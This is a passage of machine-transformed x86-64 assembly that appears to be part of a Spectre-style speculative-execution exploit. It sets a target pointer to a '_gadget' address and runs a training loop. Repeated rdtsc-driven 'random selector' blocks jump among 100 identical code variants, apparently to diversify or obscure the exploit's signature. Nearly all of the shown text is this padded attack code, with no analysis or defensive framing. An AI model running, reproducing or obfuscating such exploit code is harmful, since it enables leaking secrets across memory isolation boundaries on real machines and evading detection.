	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 29
.LreadByte_win7_var29:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 30
.LreadByte_win7_var30:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 31
.LreadByte_win7_var31:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 32
.LreadByte_win7_var32:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 33
.LreadByte_win7_var33:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 34
.LreadByte_win7_var34:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 35
.LreadByte_win7_var35:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 36
.LreadByte_win7_var36:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 37
.LreadByte_win7_var37:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 38
.LreadByte_win7_var38:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 39
.LreadByte_win7_var39:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 40
.LreadByte_win7_var40:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 41
.LreadByte_win7_var41:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 42
.LreadByte_win7_var42:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 43
.LreadByte_win7_var43:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 44
.LreadByte_win7_var44:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 45
.LreadByte_win7_var45:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 46
.LreadByte_win7_var46:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 47
.LreadByte_win7_var47:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 48
.LreadByte_win7_var48:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 49
.LreadByte_win7_var49:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 50
.LreadByte_win7_var50:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 51
.LreadByte_win7_var51:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 52
.LreadByte_win7_var52:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 53
.LreadByte_win7_var53:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 54
.LreadByte_win7_var54:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 55
.LreadByte_win7_var55:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 56
.LreadByte_win7_var56:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 57
.LreadByte_win7_var57:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 58
.LreadByte_win7_var58:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 59
.LreadByte_win7_var59:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 60
.LreadByte_win7_var60:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 61
.LreadByte_win7_var61:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 62
.LreadByte_win7_var62:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 63
.LreadByte_win7_var63:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 64
.LreadByte_win7_var64:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 65
.LreadByte_win7_var65:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 66
.LreadByte_win7_var66:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 67
.LreadByte_win7_var67:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 68
.LreadByte_win7_var68:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 69
.LreadByte_win7_var69:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 70
.LreadByte_win7_var70:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 71
.LreadByte_win7_var71:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 72
.LreadByte_win7_var72:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 73
.LreadByte_win7_var73:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 74
.LreadByte_win7_var74:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 75
.LreadByte_win7_var75:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 76
.LreadByte_win7_var76:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 77
.LreadByte_win7_var77:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 78
.LreadByte_win7_var78:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 79
.LreadByte_win7_var79:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 80
.LreadByte_win7_var80:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 81
.LreadByte_win7_var81:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 82
.LreadByte_win7_var82:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 83
.LreadByte_win7_var83:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 84
.LreadByte_win7_var84:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 85
.LreadByte_win7_var85:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 86
.LreadByte_win7_var86:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 87
.LreadByte_win7_var87:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 88
.LreadByte_win7_var88:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 89
.LreadByte_win7_var89:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 90
.LreadByte_win7_var90:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 91
.LreadByte_win7_var91:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 92
.LreadByte_win7_var92:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 93
.LreadByte_win7_var93:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 94
.LreadByte_win7_var94:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 95
.LreadByte_win7_var95:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 96
.LreadByte_win7_var96:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 97
.LreadByte_win7_var97:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 98
.LreadByte_win7_var98:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 99
.LreadByte_win7_var99:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
.LreadByte_win7_continue:
	leaq	_gadget(%rip), %rcx
	movq	%rcx, (%rax)
	mfence
	movl	$29, -1076(%rbp)
LBB3_7:                                 ##   Parent Loop BB3_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadByte_win6_var0
	cmpl	$1, %eax
	je	.LreadByte_win6_var1
	cmpl	$2, %eax
	je	.LreadByte_win6_var2
	cmpl	$3, %eax
	je	.LreadByte_win6_var3
	cmpl	$4, %eax
	je	.LreadByte_win6_var4
	cmpl	$5, %eax
	je	.LreadByte_win6_var5
	cmpl	$6, %eax
	je	.LreadByte_win6_var6
	cmpl	$7, %eax
	je	.LreadByte_win6_var7
	cmpl	$8, %eax
	je	.LreadByte_win6_var8
	cmpl	$9, %eax
	je	.LreadByte_win6_var9
	cmpl	$10, %eax
	je	.LreadByte_win6_var10
	cmpl	$11, %eax
	je	.LreadByte_win6_var11
	cmpl	$12, %eax
	je	.LreadByte_win6_var12
	cmpl	$13, %eax
	je	.LreadByte_win6_var13
	cmpl	$14, %eax
	je	.LreadByte_win6_var14
	cmpl	$15, %eax
	je	.LreadByte_win6_var15
	cmpl	$16, %eax
	je	.LreadByte_win6_var16
	cmpl	$17, %eax
	je	.LreadByte_win6_var17
	cmpl	$18, %eax
	je	.LreadByte_win6_var18
	cmpl	$19, %eax
	je	.LreadByte_win6_var19
	cmpl	$20, %eax
	je	.LreadByte_win6_var20
	cmpl	$21, %eax
	je	.LreadByte_win6_var21
	cmpl	$22, %eax
	je	.LreadByte_win6_var22
	cmpl	$23, %eax
	je	.LreadByte_win6_var23
	cmpl	$24, %eax
	je	.LreadByte_win6_var24
	cmpl	$25, %eax
	je	.LreadByte_win6_var25
	cmpl	$26, %eax
	je	.LreadByte_win6_var26
	cmpl	$27, %eax
	je	.LreadByte_win6_var27
	cmpl	$28, %eax
	je	.LreadByte_win6_var28
	cmpl	$29, %eax
	je	.LreadByte_win6_var29
	cmpl	$30, %eax
	je	.LreadByte_win6_var30
	cmpl	$31, %eax
	je	.LreadByte_win6_var31
	cmpl	$32, %eax
	je	.LreadByte_win6_var32
	cmpl	$33, %eax
	je	.LreadByte_win6_var33
	cmpl	$34, %eax
	je	.LreadByte_win6_var34
	cmpl	$35, %eax
	je	.LreadByte_win6_var35
	cmpl	$36, %eax
	je	.LreadByte_win6_var36
	cmpl	$37, %eax
	je	.LreadByte_win6_var37
	cmpl	$38, %eax
	je	.LreadByte_win6_var38
	cmpl	$39, %eax
	je	.LreadByte_win6_var39
	cmpl	$40, %eax
	je	.LreadByte_win6_var40
	cmpl	$41, %eax
	je	.LreadByte_win6_var41
	cmpl	$42, %eax
	je	.LreadByte_win6_var42
	cmpl	$43, %eax
	je	.LreadByte_win6_var43
	cmpl	$44, %eax
	je	.LreadByte_win6_var44
	cmpl	$45, %eax
	je	.LreadByte_win6_var45
	cmpl	$46, %eax
	je	.LreadByte_win6_var46
	cmpl	$47, %eax
	je	.LreadByte_win6_var47
	cmpl	$48, %eax
	je	.LreadByte_win6_var48
	cmpl	$49, %eax
	je	.LreadByte_win6_var49
	cmpl	$50, %eax
	je	.LreadByte_win6_var50
	cmpl	$51, %eax
	je	.LreadByte_win6_var51
	cmpl	$52, %eax
	je	.LreadByte_win6_var52
	cmpl	$53, %eax
	je	.LreadByte_win6_var53
	cmpl	$54, %eax
	je	.LreadByte_win6_var54
	cmpl	$55, %eax
	je	.LreadByte_win6_var55
	cmpl	$56, %eax
	je	.LreadByte_win6_var56
	cmpl	$57, %eax
	je	.LreadByte_win6_var57
	cmpl	$58, %eax
	je	.LreadByte_win6_var58
	cmpl	$59, %eax
	je	.LreadByte_win6_var59
	cmpl	$60, %eax
	je	.LreadByte_win6_var60
	cmpl	$61, %eax
	je	.LreadByte_win6_var61
	cmpl	$62, %eax
	je	.LreadByte_win6_var62
	cmpl	$63, %eax
	je	.LreadByte_win6_var63
	cmpl	$64, %eax
	je	.LreadByte_win6_var64
	cmpl	$65, %eax
	je	.LreadByte_win6_var65
	cmpl	$66, %eax
	je	.LreadByte_win6_var66
	cmpl	$67, %eax
	je	.LreadByte_win6_var67
	cmpl	$68, %eax
	je	.LreadByte_win6_var68
	cmpl	$69, %eax
	je	.LreadByte_win6_var69
	cmpl	$70, %eax
	je	.LreadByte_win6_var70
	cmpl	$71, %eax
	je	.LreadByte_win6_var71
	cmpl	$72, %eax
	je	.LreadByte_win6_var72
	cmpl	$73, %eax
	je	.LreadByte_win6_var73
	cmpl	$74, %eax
	je	.LreadByte_win6_var74
	cmpl	$75, %eax
	je	.LreadByte_win6_var75
	cmpl	$76, %eax
	je	.LreadByte_win6_var76
	cmpl	$77, %eax
	je	.LreadByte_win6_var77
	cmpl	$78, %eax
	je	.LreadByte_win6_var78
	cmpl	$79, %eax
	je	.LreadByte_win6_var79
	cmpl	$80, %eax
	je	.LreadByte_win6_var80
	cmpl	$81, %eax
	je	.LreadByte_win6_var81
	cmpl	$82, %eax
	je	.LreadByte_win6_var82
	cmpl	$83, %eax
	je	.LreadByte_win6_var83
	cmpl	$84, %eax
	je	.LreadByte_win6_var84
	cmpl	$85, %eax
	je	.LreadByte_win6_var85
	cmpl	$86, %eax
	je	.LreadByte_win6_var86
	cmpl	$87, %eax
	je	.LreadByte_win6_var87
	cmpl	$88, %eax
	je	.LreadByte_win6_var88
	cmpl	$89, %eax
	je	.LreadByte_win6_var89
	cmpl	$90, %eax
	je	.LreadByte_win6_var90
	cmpl	$91, %eax
	je	.LreadByte_win6_var91
	cmpl	$92, %eax
	je	.LreadByte_win6_var92
	cmpl	$93, %eax
	je	.LreadByte_win6_var93
	cmpl	$94, %eax
	je	.LreadByte_win6_var94
	cmpl	$95, %eax
	je	.LreadByte_win6_var95
	cmpl	$96, %eax
	je	.LreadByte_win6_var96
	cmpl	$97, %eax
	je	.LreadByte_win6_var97
	cmpl	$98, %eax
	je	.LreadByte_win6_var98
	cmpl	$99, %eax
	je	.LreadByte_win6_var99
	jmp	.LreadByte_win6_var0
## Variant 0
.LreadByte_win6_var0:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 1
.LreadByte_win6_var1:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 2
.LreadByte_win6_var2:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 3
.LreadByte_win6_var3:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 4
.LreadByte_win6_var4:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 5
.LreadByte_win6_var5:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 6
.LreadByte_win6_var6:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 7
.LreadByte_win6_var7:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 8
.LreadByte_win6_var8:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 9
.LreadByte_win6_var9:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 10
.LreadByte_win6_var10:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 11
.LreadByte_win6_var11:
